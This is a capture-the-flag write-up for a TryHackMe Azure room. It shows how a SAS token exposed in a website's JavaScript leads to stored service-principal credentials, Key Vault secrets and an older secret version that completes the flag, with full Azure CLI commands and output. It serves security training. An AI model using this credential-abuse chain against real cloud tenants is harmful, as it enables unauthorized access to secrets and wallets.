---

Name: Crypto Cabana
Difficulty: Medium
URL: https://tryhackme.com/room/hh-cryptocabana-f81cac95
Description: He never signed the transfer. The place he stashed his secret wasn't as sealed as promised.

---

# Inspecting website
We first visit the website: https://cryptocabanaf5scjagc.z13.web.core.windows.net/

Looking at the page source we find the JavaScript file, app.js

Inside we find the storage account name, the backups container and a SAS token
```javascript
const STORAGE_ACCOUNT = "cryptocabanaf5scjagc";
const BACKUPS_CONTAINER = "backups";
const BACKUP_SAS = "?sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D";
```

The SAS token has sp=rl, meaning it has read and list permissions

# Enumerating the storage account
Instead of only checking the backups container, we enumerate every container we can access

```bash
$ az storage container list \
    --account-name cryptocabanaf5scjagc \
    --sas-token "$SAS"
```

This reveals another interesting container called vault

We list its contents
```bash
$ az storage blob list \
    --account-name cryptocabanaf5scjagc \
    --container-name vault \
    --sas-token "$SAS" \
    -o table
Name                         Blob Type    Blob Tier    Length    Content Type              Last Modified              Snapshot
---------------------------  -----------  -----------  --------  ------------------------  -------------------------  ----------
backup-service-account.json  BlockBlob    Hot          360       application/json          2026-07-19T15:20:06+00:00
seed_phrase.txt              BlockBlob    Hot          88        application/octet-stream  2026-07-16T18:26:38+00:00
```

Download every blob from the container
```bash
mkdir vault

for blob in $(az storage blob list \
    --account-name cryptocabanaf5scjagc \
    --container-name vault \
    --sas-token "$SAS" \
    --query "[].name" -o tsv); do

    echo "[+] $blob"

    az storage blob download \
        --account-name cryptocabanaf5scjagc \
        --container-name vault \
        --name "$blob" \
        --file "vault/$blob" \
        --sas-token "$SAS" \
        --only-show-errors
done
```

The downloaded files contain a wallet seed phrase and the credentials for a service principal
```json
{ 
    "client_id":"dbcf2923-e4eb-4b72-a0a4-688aa1185cf5", 
    "client_secret": "<REDACTED>", 
    "tenant_id":"8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c", 
    "key_vault_name":"ccabana-kv-f5scjagc" 
}
```

# Logging in as the service principal
Using the leaked credentials we authenticate to Azure.
```bash
usr-08047607 [ ~/vault ]$ az logout

az login \
  --service-principal \
  --username dbcf2923-e4eb-4b72-a0a4-688aa1185cf5 \
  --password '<REDACTED>' \
  --tenant 8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c
Logout successful. Re-login to your initial Cloud Shell identity with 'az login --identity'. Login with a new identity with 'az login'.
Cloud Shell is automatically authenticated under the initial account signed-in with. Run 'az login' only if you need to use a different account
[
  {
    "cloudName": "AzureCloud",
    "homeTenantId": "8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c",
    "id": "2492269a-2948-46fd-aae3-68c9b066443a",
    "isDefault": true,
    "managedByTenants": [],
    "name": "Az-Subs-CTF",
    "state": "Enabled",
    "tenantId": "8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c",
    "user": {
      "name": "dbcf2923-e4eb-4b72-a0a4-688aa1185cf5",
      "type": "servicePrincipal"
    }
  }
]
```

Now we can enumerate the Key Vault secrets
```bash
usr-08047607 [ ~/vault ]$ az keyvault secret list \
    --vault-name ccabana-kv-f5scjagc \
    -o table
Name         Id                                                               ContentType    Enabled    Expires
-----------  ---------------------------------------------------------------  -------------  ---------  -------------------------
key-shard-1  https://ccabana-kv-f5scjagc.vault.azure.net/secrets/key-shard-1                 True
key-shard-2  https://ccabana-kv-f5scjagc.vault.azure.net/secrets/key-shard-2                 True
key-shard-3  https://ccabana-kv-f5scjagc.vault.azure.net/secrets/key-shard-3                 True
master-key   https://ccabana-kv-f5scjagc.vault.azure.net/secrets/master-key                  True       2020-01-01T00:00:00+00:00
```

Trying to read master-key fails because our service principal does not have permission

However, we can read the three key shards.
```bash
usr-08047607 [ ~/vault ]$ az keyvault secret show     --vault-name ccabana-kv-f5scjagc     --name key-shard-1
{
  "attributes": {
    "created": "2026-07-19T15:21:07+00:00",
    "enabled": true,
    "expires": null,
    "notBefore": null,
    "recoverableDays": 7,
    "recoveryLevel": "CustomizedRecoverable+Purgeable",
    "updated": "2026-07-19T15:21:07+00:00"
  },
  "contentType": "",
  "id": "https://ccabana-kv-f5scjagc.vault.azure.net/secrets/key-shard-1/b0554e11de4940eaa8e8bc79203646ef",
  "kid": null,
  "managed": null,
  "name": "key-shard-1",
  "tags": {},
  "value": "THM{n0t_ur"
}
usr-08047607 [ ~/vault ]$ az keyvault secret show     --vault-name ccabana-kv-f5scjagc     --name key-shard-2
{
  "attributes": {
    "created": "2026-07-28T01:05:07+00:00",
    "enabled": true,
    "expires": null,
    "notBefore": null,
    "recoverableDays": 7,
    "recoveryLevel": "CustomizedRecoverable+Purgeable",
    "updated": "2026-07-28T01:05:07+00:00"
  },
  "contentType": null,
  "id": "https://ccabana-kv-f5scjagc.vault.azure.net/secrets/key-shard-2/c922c422ffb34671a902389c372314f1",
  "kid": null,
  "managed": null,
  "name": "key-shard-2",
  "tags": {
    "file-encoding": "utf-8"
  },
  "value": "Rotated this after IT flagged it -- old value should still be recoverable if you know where to look."
}
usr-08047607 [ ~/vault ]$ az keyvault secret show     --vault-name ccabana-kv-f5scjagc     --name key-shard-3
{
  "attributes": {
    "created": "2026-07-19T15:21:07+00:00",
    "enabled": true,
    "expires": null,
    "notBefore": null,
    "recoverableDays": 7,
    "recoveryLevel": "CustomizedRecoverable+Purgeable",
    "updated": "2026-07-19T15:21:07+00:00"
  },
  "contentType": "",
  "id": "https://ccabana-kv-f5scjagc.vault.azure.net/secrets/key-shard-3/52f475d4e5484957b8751422360fc99f",
  "kid": null,
  "managed": null,
  "name": "key-shard-3",
  "tags": {},
  "value": "ur_c01ns!}"
}
```

```bash
key-shard-1 = THM{n0t_ur 
key-shard-2 = Rotated this after IT flagged it -- old value should still be recoverable if you know where to look. 
key-shard-3 = ur_c01ns!}
```

The message in key-shard-2 hints that an older version of the secret still exists

# Recovering the previous secret version
List every version of key-shard-2

```bash
$ usr-08047607 [ ~/vault ]$ az keyvault secret list-versions \
  --vault-name ccabana-kv-f5scjagc \
  --name key-shard-2 \
  --query "[].id" \
  -o tsv
https://ccabana-kv-f5scjagc.vault.azure.net/secrets/key-shard-2/3d6492d2c6f74123bc754a9ded22b2a0
https://ccabana-kv-f5scjagc.vault.azure.net/secrets/key-shard-2/c922c422ffb34671a902389c372314f1
```

Retrieve the older version
```bash
$ az keyvault secret show \
  --vault-name ccabana-kv-f5scjagc \
  --name key-shard-2 \
  --version 3d6492d2c6f74123bc754a9ded22b2a0
{
  "attributes": {
    "created": "2026-07-28T01:05:05+00:00",
    "enabled": true,
    "expires": null,
    "notBefore": null,
    "recoverableDays": 7,
    "recoveryLevel": "CustomizedRecoverable+Purgeable",
    "updated": "2026-07-28T01:05:05+00:00"
  },
  "contentType": null,
  "id": "https://ccabana-kv-f5scjagc.vault.azure.net/secrets/key-shard-2/3d6492d2c6f74123bc754a9ded22b2a0",
  "kid": null,
  "managed": null,
  "name": "key-shard-2",
  "tags": {
    "file-encoding": "utf-8"
  },
  "value": "_k3ys_n0t_"
}
```

Combining the three shards gives the flag

```txt
THM{n0t_ur_k3ys_n0t_ur_c01ns!}
```
